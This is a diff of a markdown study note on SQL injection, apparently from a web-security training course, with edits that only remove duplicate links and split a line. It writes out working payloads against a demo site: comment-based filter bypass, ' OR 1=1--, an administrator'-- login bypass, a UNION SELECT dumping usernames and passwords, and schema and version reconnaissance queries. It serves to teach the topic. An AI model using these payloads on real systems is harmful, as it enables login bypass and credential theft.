@@ -1,18 +1,16 @@
 # **SQL Injection** 
 ### Retrieving hidden data, where can modify an SQL query to return additional results 
 [https://insecure-website.com/products?category=Gifts]
-(https://insecure-website.com/products?category=Gifts "https://insecure-website.com/products?category=Gifts") 
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
 [https://insecure-website.com/products?category=Gifts%27--]
-(https://insecure-website.com/products?category=Gifts%27-- "https://insecure-website.com/products?category=Gifts%27--") 
 `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1` 
 [https://insecure-website.com/products?category=Gifts%27+OR+1=1--]
-(https://insecure-website.com/products?category=Gifts%27+OR+1=1-- "https://insecure-website.com/products?category=Gifts%27+OR+1=1--") 
 `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` 
 ### Subverting application logic, where you can change a query to interfere with the application's logic
  If a users credential is wiener:bluecheese 
 `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` 
-### UNION attacks, where you can retrieve data from different database tables `SELECT name, description FROM products WHERE category = 'Gifts'` `' UNION SELECT username, password FROM users--` 
+### UNION attacks, where you can retrieve data from different database tables 
+`SELECT name, description FROM products WHERE category = 'Gifts'` `' UNION SELECT username, password FROM users--` 
 This will cause the application to return all usernames and passwords along with the names and descriptions of products. Examining the database, where you can extract information about the version and structure of the database 
 `SELECT * FROM information_schema.tables` -- what DB table exist 
 `SELECT * FROM v$version` -- Oracle version 
